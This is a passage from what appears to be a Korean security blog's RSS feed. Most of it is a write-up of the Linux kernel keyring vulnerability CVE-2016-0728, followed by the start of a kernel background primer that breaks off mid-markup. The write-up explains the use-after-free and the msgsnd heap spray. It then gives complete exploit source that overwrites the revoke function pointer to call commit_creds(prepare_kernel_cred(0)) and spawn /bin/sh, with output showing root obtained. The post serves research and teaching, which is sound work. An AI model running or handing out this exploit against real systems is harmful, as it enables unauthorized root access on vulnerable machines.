<code>0xb8 ~ 0x30</code>으로 설정한다. 이 때, <code>keyring</code>오브젝트의 데이터 길이는 <code>0xb8</code>이 되며 정보헤더의 데이터 길이는 <code>0x30</code>이다.</p><blockquote><p>이 과정에서 SLAB 메모리 메커니즘에 관한 설명이 나온다. 이 부분은 링크를 참조하자.</p><p><a href="http://egloos.zum.com/rousalome/v/9964885" target="_blank" rel="noopener">http://egloos.zum.com/rousalome/v/9964885</a> </p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((msqid = msgget(IPC_PRIVATE, <span class="number">0644</span> | IPC_CREAT)) == <span class="number">-1</span>) &#123;</span><br><span class="line">    perror(<span class="string">"msgget"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (msgsnd(msqid, &amp;msg, <span class="keyword">sizeof</span>(msg.mtext), <span class="number">0</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">"msgsnd"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>이렇게 우리는 <code>keyring</code>오브젝트의 하위 <code>0x88</code>bytes를 마음대로 컨트롤 할 수 있다.</p><p>마지막으로, 어느 포인터를 덮어야할지 생각해보자.</p><p><code>keyring</code>오브젝트 내부에는 <code>key_type</code>이라는 구조가 있다.</p><p>여기에는 다양한 함수 포인터가 존재한다. </p><p>이를 이용하여, <code>key_type</code>내부의 함수포인터를 <code>user space</code>에 존재하는 구조체를 가리켜 <code>root</code>권한으로 함수 포인터를 실행시킬 수 있다.</p><p>더 자세하게 알아보자.</p><p>keyring 오브젝트는 아래와 같은 방식으로 내용을 채운다. </p><p><img src="https://user-images.githubusercontent.com/43925259/68629768-5a4c4500-0528-11ea-90b4-26ae7db2a351.jpg" alt="992D684B5DB876D21C"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">key_revoke</span><span class="params">(struct key *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       . . .</span><br><span class="line">       <span class="keyword">if</span> (!test_and_set_bit(KEY_FLAG_REVOKED, &amp;key-&gt;flags) &amp;&amp;</span><br><span class="line">           key-&gt;type-&gt;revoke)</span><br><span class="line">               key-&gt;type-&gt;revoke(key);</span><br><span class="line">       . . .</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>keyring</code>의 <code>uid</code>와 <code>flags</code>값을 활용하여 계속해서 <code>keyring</code>오브젝트를 로딩한다.</p><p>그리고 이 과정에서 테스트를 진행하는데, <code>key -&gt; type -&gt; revoke</code>순으로 참조한다.</p><p>여기서 <code>revoke</code>는 함수포인터다. 우리는 이 부분을 이용할 수 있다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> __attribute__((regparm(<span class="number">3</span>))) (* _commit_creds)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> __attribute__((regparm(<span class="number">3</span>))) (* _prepare_kernel_cred)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key_type_s</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span> * [<span class="number">12</span>] padding;</span><br><span class="line">    <span class="keyword">void</span> * revoke;</span><br><span class="line">&#125; type;</span><br><span class="line"></span><br><span class="line">_commit_creds commit_creds = <span class="number">0xffffffff81094250</span>;</span><br><span class="line">_prepare_kernel_cred prepare_kernel_cred = <span class="number">0xffffffff81094550</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">userspace_revoke</span><span class="params">(<span class="keyword">void</span> * key)</span> </span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key_type</span> * <span class="title">my_key_type</span> = <span class="title">NULL</span>;</span></span><br><span class="line">    ...</span><br><span class="line">    my_key_type = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(*my_key_type));</span><br><span class="line">    my_key_type-&gt;revoke = (<span class="keyword">void</span>*)userspace_revoke;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>commit_creds</code>와 <code>prepare_kernel_cred</code>함수의 주소를 구한 후, <code>my_key_type-&gt;revoke = (void*)userspace_revoke;</code>으로 <code>revoke</code>함수에 <code>commit_creds</code>와 <code>prepare_kernel_cred</code>함수를 넣어준다. 그리고 이를 실행시킨다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* $ gcc cve_2016_0728.c -o cve_2016_0728 -lkeyutils -Wall */</span></span><br><span class="line"><span class="comment">/* $ ./cve_2016_072 PP_KEY */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> __attribute__((regparm(<span class="number">3</span>))) (* _commit_creds)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> __attribute__((regparm(<span class="number">3</span>))) (* _prepare_kernel_cred)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line">_commit_creds commit_creds;</span><br><span class="line">_prepare_kernel_cred prepare_kernel_cred;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STRUCT_LEN (0xb8 - 0x30)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS_ADDR (0xffffffff81094250)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREPARE_KERNEL_CREDS_ADDR (0xffffffff81094550)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key_type</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> * name;</span><br><span class="line">    <span class="keyword">size_t</span> datalen;</span><br><span class="line">    <span class="keyword">void</span> * vet_description;</span><br><span class="line">    <span class="keyword">void</span> * preparse;</span><br><span class="line">    <span class="keyword">void</span> * free_preparse;</span><br><span class="line">    <span class="keyword">void</span> * instantiate;</span><br><span class="line">    <span class="keyword">void</span> * update;</span><br><span class="line">    <span class="keyword">void</span> * match_preparse;</span><br><span class="line">    <span class="keyword">void</span> * match_free;</span><br><span class="line">    <span class="keyword">void</span> * revoke;</span><br><span class="line">    <span class="keyword">void</span> * destroy;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">userspace_revoke</span><span class="params">(<span class="keyword">void</span> * key)</span> </span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *keyring_name;</span><br><span class="line"><span class="keyword">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> l = <span class="number">0x100000000</span>/<span class="number">2</span>;</span><br><span class="line"><span class="keyword">key_serial_t</span> serial = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">pid_t</span> pid = <span class="number">-1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key_type</span> * <span class="title">my_key_type</span> = <span class="title">NULL</span>;</span></span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span> </span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line"><span class="keyword">char</span> mtext[STRUCT_LEN];</span><br><span class="line">&#125; </span><br><span class="line">    msg = &#123;<span class="number">0x4141414141414141</span>, &#123;<span class="number">0</span>&#125;&#125;;</span><br><span class="line"><span class="keyword">int</span> msqid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"usage: ./keys &lt;key_name&gt;"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"uid=%d, euid=%d\n"</span>, getuid(), geteuid()); </span><br><span class="line">    commit_creds = (_commit_creds) COMMIT_CREDS_ADDR;</span><br><span class="line">    prepare_kernel_cred = (_prepare_kernel_cred) PREPARE_KERNEL_CREDS_ADDR;</span><br><span class="line">    </span><br><span class="line">    my_key_type = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(*my_key_type));</span><br><span class="line"></span><br><span class="line">    my_key_type-&gt;revoke = (<span class="keyword">void</span>*)userspace_revoke;</span><br><span class="line">    <span class="built_in">memset</span>(msg.mtext, <span class="string">'A'</span>, <span class="keyword">sizeof</span>(msg.mtext));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// key-&gt;uid</span></span><br><span class="line">    *(<span class="keyword">int</span>*)(&amp;msg.mtext[<span class="number">56</span>]) = <span class="number">0x3e8</span>; <span class="comment">/* geteuid() */</span></span><br><span class="line">    <span class="comment">//key-&gt;perm</span></span><br><span class="line">    *(<span class="keyword">int</span>*)(&amp;msg.mtext[<span class="number">64</span>]) = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//key-&gt;type</span></span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(&amp;msg.mtext[<span class="number">80</span>]) = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)my_key_type;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((msqid = msgget(IPC_PRIVATE, <span class="number">0644</span> | IPC_CREAT)) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">"msgget"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    keyring_name = argv[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set the new session keyring before we start */</span></span><br><span class="line"></span><br><span class="line">serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name);</span><br><span class="line"><span class="keyword">if</span> (serial &lt; <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">"keyctl"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL | KEY_GRP_ALL | KEY_OTH_ALL) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">"keyctl"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Increfing..."</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">0xfffffffd</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == (<span class="number">0xffffffff</span> - l)) &#123;</span><br><span class="line">            l = l/<span class="number">2</span>;</span><br><span class="line">            sleep(<span class="number">5</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">"keyctl"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="comment">/* here we are going to leak the last references to overflow */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">5</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">"keyctl"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"finished increfing"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"forking..."</span>);</span><br><span class="line">    <span class="comment">/* allocate msg struct in the kernel rewriting the freed keyring object */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">64</span>; i++) &#123;</span><br><span class="line">        pid = fork();</span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">-1</span>) &#123;</span><br><span class="line">            perror(<span class="string">"fork"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">            sleep(<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span> ((msqid = msgget(IPC_PRIVATE, <span class="number">0644</span> | IPC_CREAT)) == <span class="number">-1</span>) &#123;</span><br><span class="line">                perror(<span class="string">"msgget"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (msgsnd(msqid, &amp;msg, <span class="keyword">sizeof</span>(msg.mtext), <span class="number">0</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">                    perror(<span class="string">"msgsnd"</span>);</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            sleep(<span class="number">-1</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"finished forking"</span>);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* call userspace_revoke from kernel */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"caling revoke..."</span>);</span><br><span class="line">    <span class="keyword">if</span> (keyctl(KEYCTL_REVOKE, KEY_SPEC_SESSION_KEYRING) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">"keyctl_revoke"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"uid=%d, euid=%d\n"</span>, getuid(), geteuid());</span><br><span class="line">    execl(<span class="string">"/bin/sh"</span>, <span class="string">"/bin/sh"</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$./cve_2016_0728 PP1</span><br><span class="line">uid=1000, euid=1000</span><br><span class="line">Increfing...</span><br><span class="line">finished increfing</span><br><span class="line">forking...</span><br><span class="line">finished forking</span><br><span class="line">caling revoke...</span><br><span class="line">uid=0, euid=0</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>정상적으로 <code>root</code>쉘을 획득할 수 있다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://procdiaru.tistory.com/89" target="_blank" rel="noopener">https://procdiaru.tistory.com/89</a> </li><li><a href="https://bpsecblog.wordpress.com/2016/04/10/translate_cve20160728/" target="_blank" rel="noopener">https://bpsecblog.wordpress.com/2016/04/10/translate_cve20160728/</a> </li><li><a href="https://perception-point.io/resources/research/analysis-and-exploitation-of-a-linux-kernel-vulnerability/" target="_blank" rel="noopener">https://perception-point.io/resources/research/analysis-and-exploitation-of-a-linux-kernel-vulnerability/</a> </li><li><a href="https://blog.naver.com/PostView.nhn?blogId=skinfosec2000&amp;logNo=220612669396&amp;proxyReferer=https%3A%2F%2Fwww.google.com%2F" target="_blank" rel="noopener">https://blog.naver.com/PostView.nhn?blogId=skinfosec2000&amp;logNo=220612669396&amp;proxyReferer=https%3A%2F%2Fwww.google.com%2F</a> </li><li><a href="http://egloos.zum.com/rousalome/v/9964885" target="_blank" rel="noopener">http://egloos.zum.com/rousalome/v/9964885</a> </li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content:encoded>
      
      <comments>https://defenit.kr/2019/11/12/Pwn/%E3%84%B4%20Research/CVE_2016_0728/#disqus_thread</comments>
    </item>
    
    <item>
      <title>커널 배경지식 정리</title>
      <link>https://defenit.kr/2019/10/21/Pwn/%E3%84%B4%20Research/%EC%BB%A4%EB%84%90_%EA%B8%B0%EC%B4%88/</link>
      <guid>https://defenit.kr/2019/10/21/Pwn/%E3%84%B4%20Research/%EC%BB%A4%EB%84%90_%EA%B8%B0%EC%B4%88/</guid>
      <pubDate>Mon, 21 Oct 2019 08:25:20 GMT</pubDate>
      <description>
      
        
        
          &lt;h3 id=&quot;목차&quot;&gt;&lt;a href=&quot;#목차&quot; class=&quot;headerlink&quot; title=&quot;목차&quot;&gt;&lt;/a&gt;목차&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;커널 보호기법&lt;/li&gt;
&lt;li&gt;리눅스 커널 모듈 - 명령어&lt;/li&gt;
&lt;li&gt;리눅스 커널 모듈 - 함수&lt;/li&gt;
&lt;l
        
      
      </description>
      
      <content:encoded><![CDATA[<h3 id="목차"><a href="#목차" class="headerlink" title="목차"></a>목차</h3><ul><li>커널 보호기법</li><li>리눅스 커널 모듈 - 명령어</li><li>리눅스 커널 모듈 - 함수</li><li>user mode -&gt; kernel mode</li><li>kernel mode -&gt; user mode</li><li>기본 설정</li></ul><p><hr></p><h3 id="커널-보호기법"><a href="#커널-보호기법" class="headerlink" title="커널 보호기법"></a>커널 보호기법</h3><ul><li><h5 id="KASLR-Kernel-Address-Space-Layout-Randomization"><a href="#KASLR-Kernel-Address-Space-Layout-Randomization" class="headerlink" title="KASLR (Kernel Address Space Layout Randomization)"></a><code>KASLR</code> (Kernel Address Space Layout Randomization)</h5><p>-&gt; <strong>커널의 메모리 주소를 랜덤화</strong> 시킨다.</p></li><li><h5 id="SMEP-Supervisor-Mode-Execution-Protection"><a href="#SMEP-Supervisor-Mode-Execution-Protection" class="headerlink" title="SMEP (Supervisor Mode Execution Protection)"></a><code>SMEP</code> (Supervisor Mode Execution Protection)</h5><p>-&gt; <strong>유저 영역의 주소 공간에서 커널의 코드를 실행을 방지</strong>한다.</p></li><li><h5 id="SMAP-Supervisor-Mode-Access-Protection"><a href="#SMAP-Supervisor-Mode-Access-Protection" class="headerlink" title="SMAP (Supervisor Mode Access Protection)"></a><code>SMAP</code> (Supervisor Mode Access Protection)</h5><p>-&gt; <strong>유저 영역의 주소 공간에서 메모리 접근을 비허용</strong>한다.</p></li><li><h5 id="KADR-Kernel-Address-Display-Restriction"><a href="#KADR-Kernel-Address-Display-Restriction" class="headerlink" title="KADR (Kernel Address Display Restriction)"></a><code>KADR</code> (Kernel Address Display Restriction)</h5><p>-&gt; <strong>비 루트 사용자가 커널 주소의 정보를 얻는 것을 제한</strong>한다.</p><p>-&gt; 모든 커널 심볼이 저장된 <code>/proc/kallsyms</code>파일의 심볼 주소가 0으로 표시된다.</p></li><li><h5 id="KPRI-Kernel-Page-Table-Isolation"><a href="#KPRI-Kernel-Page-Table-Isolation" class="headerlink" title="KPRI (Kernel Page Table Isolation)"></a><code>KPRI</code> (Kernel Page Table Isolation)</h5><p>-&gt; <strong>유저 공간에서 커널 공간의 데이터 획득을 막기 위해 page를 따로 사용하는 것</strong></p></li><li><h5 id="canary"><a href="#canary" class="headerlink" title="canary"></a><code>canary</code></h5><p>-&gt; <strong>모듈에 카나리가 있을 경우 BOF를 방지</strong>한다.</p></li></ul><p><hr></p><h3 id="리눅스-커널-모듈-명령어"><a href="#리눅스-커널-모듈-명령어" class="headerlink" title="리눅스 커널 모듈 - 명령어"></a>리눅스 커널 모듈 - 명령어</h3><ul><li><h5 id="lsmod"><a href="#lsmod" class="headerlink" title="lsmod"></a><code>lsmod</code></h5><p>-&gt; <strong>실행중인 모듈 리스트</strong>를 확인할 때 사용</p></li><li><h5 id="insmod-모듈-명"><a href="#insmod-모듈-명" class="headerlink" title="insmod [모듈 명]"></a><code>insmod</code> [모듈 명]</h5><p>-&gt; <strong>커널에 모듈 삽입</strong>할 때 사용</p></li><li><h5 id="modinfo-모듈-명"><a href="#modinfo-모듈-명" class="headerlink" title="modinfo [모듈 명]"></a><code>modinfo</code> [모듈 명]</h5><p>-&gt; <strong>모듈 정보</strong>를 볼 때 사용</p></li><li><h5 id="rmmood-모듈-명"><a href="#rmmood-모듈-명" class="headerlink" title="rmmood [모듈 명]"></a><code>rmmood</code> [모듈 명]</h5><p>-&gt; <strong>모듈을 삭제</strong>할 때 사용</p></li></ul><p><hr></p><h3 id="리눅스-커널-모듈-함수"><a href="#리눅스-커널-모듈-함수" class="headerlink" title="리눅스 커널 모듈 - 함수"></a>리눅스 커널 모듈 - 함수</h3><ul><li><h5 id="module-init"><a href="#module-init" class="headerlink" title="module_init"></a><code>module_init</code></h5><p>-&gt; <strong>모듈을 적재할 때 실행</strong>하는 함수</p><p>-&gt; 성공하면 0을 반환</p></li><li><h5 id="module-exit"><a href="#module-exit" class="headerlink" title="module_exit"></a><code>module_exit</code></h5><p>-&gt; <strong>모듈을 삭제할 때 실행</strong>되는 함수</p></li><li><h5 id="printk"><a href="#printk" class="headerlink" title="printk"></a><code>printk</code></h5><p>-&gt; <code>printf</code>와 비슷한 함수</p><p>-&gt; printf는 <code>stdout</code>에 출력하지만, printk는 <code>kernel ring buffer</code>에 값을 출력</p><p>-&gt; <code>dmesg</code> 명령이나 <code>/var/log/messages</code> 또는 <code>/var/log/kern.log</code> 파일에서 확인 가능</p></li><li><h5 id="kmalloc"><a href="#kmalloc" class="headerlink" title="kmalloc"></a><code>kmalloc</code></h5><p>-&gt; <code>malloc</code>과 비슷한 함수</p><p>-&gt; kmalloc는 <code>ptmalloc2</code>가 아닌 <code>slab allocator</code>를 통해 메모리를 할당</p></li><li><h5 id="kfree"><a href="#kfree" class="headerlink" title="kfree"></a><code>kfree</code></h5><p>-&gt; <code>free</code>와 비슷한 함수</p><p>-&gt; kfree는 <code>ptmalloc2</code>가 아닌 <code>slab allocator</code>를 통해 메모리를 해제</p></li><li><h5 id="copy-from-user"><a href="#copy-from-user" class="headerlink" 